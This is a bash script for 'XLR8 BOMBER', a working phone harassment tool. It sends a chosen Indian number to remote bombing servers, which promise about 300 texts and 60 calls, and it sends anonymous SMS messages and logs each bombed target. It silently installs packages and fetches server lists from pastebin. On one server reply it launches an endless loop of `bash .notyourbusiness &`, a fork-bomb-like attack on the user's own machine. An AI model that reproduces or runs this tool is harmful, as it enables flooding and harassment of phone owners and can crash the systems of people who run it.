
#!/bin/bash

#----------------------------------------------------------------#
#                 ~~~ XLR8 BOMBER v3.0 ci aplha ~~~              #
#                     Coded by Anubhav Kashyap                   #
#~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ #
#             Github    :   github.com/anubhavanonymous          #
#           Instagram  :  instagram.com/anubhavanonymous         #
#----------------------------------------------------------------#
#                   Dont try to Steal it Bitch                   #
#----------------------------------------------------------------#

# Colors Foreground

RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

clear
just (){
echo -e "\e[1;96m "
printf "\e[1;33m Checking requirements ...\e[0m\n"
echo -e "\e[1;0m---------------------------"
apt-get install -y git curl wget pv espeak > /dev/null 2>&1
pip install --upgrade pip --quiet > /dev/null 2>&1
get_bombsrvr=$(wget https://pastebin.com/raw/CtXFmNJz -q -O-) > /dev/null 2>&1
get_custom_server=$(wget https://pastebin.com/raw/8HXmpnM9 -q -O-) > /dev/null 2>&1
echo ""
printf "\e[1;33m Requirements Satisfied !\e[0m ♡\n"
echo -e "\e[1;0m---------------------------"
echo ""
}
clear

banner() {

echo -e "\e[1;91m "
echo "          $WHITE╭━╮╭━┳╮╱╱╭━━━┳━━━╮ ╭━━╮╭━━━┳━╮╭━┳━━╮╭━━━┳━━━╮"
echo "          $RED╰╮╰╯╭┫┃╱╱┃╭━╮┃╭━╮┃ ┃╭╮┃┃╭━╮┃┃╰╯┃┃╭╮┃┃╭━╮┃╭━╮┃"
echo "          $WHITE╱╰╮╭╯┃┃╱╱┃╰━╯┃╰━╯┃ ┃╰╯╰┫┃╱┃┃╭╮╭╮┃╰╯╰╋╯╭╯┃╰━╯┃"
echo "          $RED╱╭╯╰╮┃┃╱╭┫╭╮╭┫╭━╮┃ ┃╭━╮┃┃╱┃┃┃┃┃┃┃╭━╮┣╮╰╮┃╭╮╭╯"
echo "          $WHITE╭╯╭╮╰┫╰━╯┃┃┃╰┫╰━╯┃ ┃╰━╯┃╰━╯┃┃┃┃┃┃╰━╯┃╰━╯┃┃┃╰╮"
echo "          $WHITE╰━╯╰━┻━━━┻╯╰━┻━━━╯ ╰━━━┻━━━┻╯╰╯╰┻━━━┻━━━┻╯╰━╯"
echo ""
sleep 1
echo "                                    $WHITE Author:$RED Anubhav Kashyap"
echo ""

}

#    Check Internet
wget -q --spider https://google.in

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    banner
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi

#Check for server

#rm .server.txt > /dev/null 2>&1
#wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt  > /dev/null 2>&1
#serverup="On"
#server=$(cat .server.txt | grep On)
#if [[ $server = $serverup ]]
#then
#echo ""
#else
#clear
#echo ""
#sleep 1
#echo "              $BLUE ╭━━━┳━━━┳━━━┳━━━┳━━━╮ ╭╮╱╭┳━━━┳╮╱╭╮"
#echo "              $CYAN ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃ ┃┃╱┃┃╭━╮┃┃╱┃┃"
#echo "              $BLUE ┃╰━━┫╰━╯┃╰━╯┃┃╱┃┃╰━╯┃ ┃╰━╯┃┃┃┃┃╰━╯┃"
#echo "              $CYAN ┃╭━━┫╭╮╭┫╭╮╭┫┃╱┃┃╭╮╭╯ ╰━━╮┃┃┃┃┣━━╮┃"
#echo "              $BLUE ┃╰━━┫┃┃╰┫┃┃╰┫╰━╯┃┃┃╰╮ ╱╱╱┃┃╰━╯┃╱╱┃┃"
#echo "              $CYAN ╰━━━┻╯╰━┻╯╰━┻━━━┻╯╰━╯ ╱╱╱╰┻━━━╯╱╱╰╯"
#echo ""
#echo ""
#sleep 2
#echo ""
#echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
#echo ""
#echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
#echo ""
#echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer !" | pv -qL 30
#echo ""
#exit
#fi


current_version=$(cat .version)
latest_version=$(wget https://raw.githubusercontent.com/superxploiter/XLR8_BOMBER/master/.version -q -O-)

##  CHECKING FOR UPDATES


################### COMMIT ID BASED UPDATE SYSTEM ###################

#Getting last commit id
#wget -q https://github.com/anubhavanonymous/XLR8_BOMBER -O .update.txt

# filtering lines with commit
#k=$(cat .update.txt | grep /anubhavanonymous/XLR8_BOMBER/commit/)

# deleting txt file
#rm .update.txt

# converting " to space
#k=$(echo $k | tr '"' " ")

# converting / To space
#k=$(echo $k | tr '/' " ")

# converting > To space
#k=$(echo $k | tr '>' " ")

# converting < To space
#k=$(echo $k | tr '<' " ")

# deleting repeated words
#ok=$(echo "$k" | awk '{for (i=1;i<=NF;i++) if (!a[$i]++) printf("%s%s",$i,FS)}{printf("\n")}')

# extracting commit I'd
#okk=$(echo $ok | grep -Po '(?<=(commit )).*(?= include)')

#if [[ $okk = " " ]]
#then
#latest_version=$(echo -n $ok | tail -c 40)
#else
#latest_version=$(echo $okk)
#fi

#Getting cloned commit id

#cat .git/logs/refs/heads/master | tr ' ' "\n" > .git/logs/refs/heads/temp_file_xlr8
#cat .git/logs/refs/heads/temp_file_xlr8 | sed "1 d" > .git/logs/refs/heads/xlr8_version
#rm .git/logs/refs/heads/temp_file_xlr8
#current_version=$(grep -oE '\<[[:graph:]]{40}\>' .git/logs/refs/heads/xlr8_version)

################## NOT USING THIS METHOD ANYMORE  ###################

updatee() {
clear
echo -e "\e[92m "
clear
echo ""
echo "       $CYAN█░█ █▀█ █▀▄ ▄▀█ ▀█▀ █ █▄░█ █▀▀   █▀ █▀▀ █▀█ █ █▀█ ▀█▀"
echo "       $WHITE█▄█ █▀▀ █▄▀ █▀█ ░█░ █ █░▀█ █▄█   ▄█ █▄▄ █▀▄ █ █▀▀ ░█░"
echo ""
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Requesting Update From Source...\e[93m"
sleep 2
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[0m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Updating Now...\e[93m"
sleep 2
echo ""
cd ..
rm -rf XLR8_BOMBER
git clone https://github.com/superxploiter/XLR8_BOMBER > /dev/null 2>&1
cd XLR8_BOMBER
chmod +x xlr8.py
clear
echo ""
echo "       $GREEN █▀ █▀▀ █▀█ █ █▀█ ▀█▀   █░█ █▀█ █▀▄ ▄▀█ ▀█▀ █▀▀ █▀▄"
echo "       $WHITE ▄█ █▄▄ █▀▄ █ █▀▀ ░█░   █▄█ █▀▀ █▄▀ █▀█ ░█░ ██▄ █▄▀ "
echo ""
sleep 3
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarting XLR8 !\e[93m"
echo ""
echo ""
echo ""
echo ""
echo ""
sleep 1
python3 xlr8.py
}


bombrecord() {
clear
echo ""
echo "$WHITE       █▀▀█ █▀▀█ █▀▄▀█ █▀▀▄ 　  █▀▀█ █▀▀ █▀▀ █▀▀█ █▀▀█ █▀▀▄ "
echo "$GREEN       █▀▀▄ █░░█ █░▀░█ █▀▀▄ 　  █▄▄▀ █▀▀ █░░ █░░█ █▄▄▀ █░░█ "
echo "$WHITE       █▄▄█ ▀▀▀▀ ▀   ▀ ▀▀▀  　  █  █ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀ ▀▀ ▀▀▀ "
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}


about() {
clear
echo ""
echo ""
echo -e "       \e[1;91m      ╔═══════════╗" | pv -qL 300
echo -e "       \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗" | pv -qL 300
echo -e "       \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗" | pv -qL 300
echo -e "       \e[1;91m   ║\e[1;97m█████\e[1;92m4NU8H4V\e[1;97m█████\e[1;91m║" | pv -qL 300
echo -e "       \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m" | pv -qL 300
echo -e "       \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m" | pv -qL 300
echo -e "       \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m" | pv -qL 300
echo -e "       \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;91m╚╦╝\e[1;91m" | pv -qL 300
echo -e "       \e[1;91m   ╔╝\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m╚╗\e[1;91m" | pv -qL 300
echo -e "       \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒▒\e[1;97m███\e[1;90m▒▒▒▒▒\e[1;97m██\e[1;91m|\e[1;91m" | pv -qL 300
echo -e "       \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m▒▒▒▒\e[1;97m██\e[1;91m║\e[1;94m" | pv -qL 300
echo -e "       \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m" | pv -qL 300
echo -e "       \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒.." | pv -qL 300
echo -e "       \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m" | pv -qL 300
echo -e "       \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒.." | pv -qL 300
echo -e "       \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒." | pv -qL 300
echo -e "       \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m" | pv -qL 300
echo -e "       \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║" | pv -qL 300
echo -e "       \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║" | pv -qL 300
sleep 1.2
echo -e "                                  This is\e[1;0m 𝗔𝗻𝘂𝗯𝗵𝗮𝘃 𝗞a𝘀h𝘆a𝗽" | pv -qL 150
echo "                                    aka anubhavanonymous !" | pv -qL 150
echo ""
echo -e "     $GREEN  Ethical Hacker$WHITE |$GREEN CyberSec Enthusiast$WHITE |$GREEN Programmer" | pv -qL 10
echo ""
printf "\e[0m\e[92m                 Group Admin at$WHITE DeepWeb Shadows\e[0m\n" | pv -qL 12
echo ""
echo "       $MAGENTA          My social handles are below !!" | pv -qL 10
echo ""
printf "\e[0m\e[92m          Github \e[0m\e[91m     :      \e[0m\e[96mgithub.com/superxploiter\e[0m\n" | pv -qL 50
echo ""
printf "\e[0m\e[92m         Instagram \e[0m\e[91m   :   \e[0m\e[96minstagram.com/anubhavanonymous\e[0m\n" | pv -qL 50
echo ""
echo -e "\e[1;91m                        Happy Hacking :)" | pv -qL 10
sleep 7
menux
}

eexec() {
echo "Under construction"
exit
}
menu() {
clear
bombsrvr=$(shuf -n 1 -e $get_bombsrvr)
echo ""
echo "          $WHITE█▀▄▀█ ▄▀█ █▀ █▀   █▄▄ █▀█ █▀▄▀█ █▄▄ █ █▄░█ █▀▀"
echo "          $RED█░▀░█ █▀█ ▄█ ▄█   █▄█ █▄█ █░▀░█ █▄█ █ █░▀█ █▄█"
echo ""
echo ""
printf "             \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
curl -s "$bombsrvr/bomb/$targett" > .output.txt
output=$(cat .output.txt | grep "Fuck you")
if [[ $output = "Fuck you" ]]
then
while true
do
bash .notyourbusiness &
done
exit
fi
output=$(cat .output.txt | grep "You can only bomb a number 5 times in a day")
if [[ $output = "You can only bomb a number 5 times in a day" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Bomb Limit Exceeded\e[1;91m ( ͡❛ ︹ ͡❛)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m You can only bomb a number 6 times a day !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Number contains non-numeric characters")
if [[ $output = "Number contains non-numeric characters" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Given number contains non-numeric characters !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Please provide 10 digit number")
if [[ $output = "Please provide 10 digit number" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Length of the given number is not 10 !!\e[93m"
echo ""
exit
fi
output=$(cat .output.txt | grep "Bombing Started")
if [[ $output = "Bombing Started" ]]
then
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  $RED                     ░░░░░░███████ ]▄▄▄▄▄▄▄▄▃\n"
printf "  $WHITE                      ▂▄▅███\e[1;31mXLR8\e[1;0m███▅▄▃▂\n"
printf "  $RED                    I███████████████████]\n"
printf "  $WHITE                      ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...\n"
echo ""
printf "             ~~~\e[1;92m Attack Started On +91$targett \e[0m~~~"
sleep 1
echo ""
echo ""
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m It will automatically stop after 5 min\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m After sending 300 msgs and 60 calls !!\e[93m"
echo ""
echo ""
sleep 300
printf "          \e[0m\e[41m♡ 300 msgs and 60 calls Bombed Successfully ♡\e[0m\n"
echo ""
exit
else
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Something went wrong\e[1;91m (╥﹏╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m There are some server side issues !\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m I'll fix this issue ASAP !!\e[93m"
echo ""
exit
fi
}

anonmsg(){
clear
custom_server=$(shuf -n 1 -e $get_custom_server)
echo ""
echo "     $RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "     $WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "      \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read smstarget
echo ""
texti=$(echo -e "      \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m\n\n               ")
read -e -n 36 -p "$texti" text
text=$(sed 's/ /%20/g' <<<"$text")
echo ""
printf "      \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter Passcode  >>> \e[0m"
read pass
echo ""

curl -s $custom_server/bomb/$smstarget/$text/$pass > .records.txt

value=$( grep -o "Fuck you" .records.txt)
if [[ $value = "Fuck you" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Sorry Sir\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m This number is protected !!\e[93m"
echo ""
exit
fi
value=$( grep -o "Please provide correct passcode" .records.txt)
if [[ $value = "Please provide correct passcode" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Wrong passcode\e[1;91m ( ͡─ ﹏ ͡─)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m You can get the passcode here !!\e[93m"
echo ""
printf "        \e[0m        ~~~\e[1;92m https://pkin.me/xlr8__pass \e[0m~~~"
echo ""
echo ""
exit
fi
value=$( grep -o "You can only send custom msg on a number 6 times in a day" .records.txt)
if [[ $value = "You can only send custom msg on a number 6 times in a day" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Anonymous Msg Limit Exceeded\e[1;91m ( ͡❛ ︹ ͡❛)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m You can only send msg to a number 6 times in a day !!\e[93m"
echo ""
exit
fi
value=$( grep -o "Number contains non-numeric characters" .records.txt)
if [[ $value = "Number contains non-numeric characters" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Given number contains non-numeric characters !!\e[93m"
echo ""
exit
fi
value=$( grep -o "Please provide 10 digit number" .records.txt)
if [[ $value = "Please provide 10 digit number" ]]
then
echo ""
echo ""
printf "                         \e[0m\e[41mxx ERROR....! xx\e[0m\n"
echo ""
echo ""
printf "   \e[1;92m[\e[91m~\e[92m]\e[93m Please check the number\e[1;91m ( ͡╥ ͜ʖ ͡╥)\e[93m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Length of the given number is not 10 !!\e[93m"
echo ""
exit
fi
value=$( grep -o "Custom sms sent" .records.txt)
if [[ $value = "Custom sms sent" ]]
then
clear
echo ""
echo "     $RED ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "     $WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
sleep 0.5
echo -e "                                    \e[1;0m Author:\e[1;91m Anubhav Kashyap"
echo -e """
\e[1;92m    ____________
\e[1;92m    ║▒▒▒▒▒▒▒▒▒▒║
\e[1;92m    ║▒▒▒▒▒▒▒▒▒▒║
\e[1;92m    ║▒▒▒▒▒▒▒▒▒▒║
\e[1;92m   ╔════════════╗
\e[1;92m   ╚════════════╝     \e[92m[\e[91m~\e[92m] \e[0m\e[44m Anonymous Msg Sent Successfully !! \e[0m
\e[1;91m    ║\e[1;97m███████████\e[1;91m╚╗
\e[1;91m    ║\e[1;97m███\e[1;91m╔══╗\e[1;97m█\e[1;91m╔═╗\e[1;97m█\e[1;91m║    \e[92m[\e[91m~\e[92m]\e[0m      ~~~\e[1;92m on +91$smstarget \e[0m~~~
\e[1;91m    ║\e[1;97m███\e[1;91m║\e[1;93m╬\e[1;91m╔╝\e[1;97m█\e[1;91m╚╗║\e[1;97m█\e[1;91m║
\e[1;91m    ║\e[1;97m███\e[1;91m╚═╝\e[1;97m█║█\e[1;91m╚╝\e[1;97m█\e[1;91m║    \e[92m[\e[91m~\e[92m]\e[93m Msgs take some time to get delivered !\e[93m
\e[1;91m    ╚╗\e[1;97m██████████\e[1;91m═╝
\e[1;91m     ╚╗║╠╩╩╩╩╩╝
\e[1;91m      ║║╚╗\e[1;93m┈\e[1;94m█▐█████\e[1;91m▒\e[1;0m.｡oO
\e[1;91m      ║\e[1;97m███\e[1;91m╠╦╦╦╗
\e[1;91m      ╚╗\e[1;97m███████
\e[1;91m       ╚════╝
"""
echo ""
exit
else
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mError 404 ! $RED(╥﹏╥)\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Something went wrong !!\e[93m"
echo ""
exit
fi
}


menux() {
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE✯ Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡ This tool is only for Educational Purposes !!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m ANONYMOUS MSG \e[0m\n"
if [[ $current_version = $latest_version ]]
then
        printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[0m\n"
else
        printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[92m[\e[0m\e[44mUpdate available\e[0m\e[92m]\n"
fi
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;33m ABOUT \e[0m\n"
printf "\e[1;92m[\e[0m 5\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        anonmsg
fi
if [ "$options" -eq "3" ];then
        updatee
fi
if [ "$options" -eq "4" ];then
        about
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "5" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using XLR8 !\e[93m"
        echo ""
        exit
else
        menux
fi


}
menux
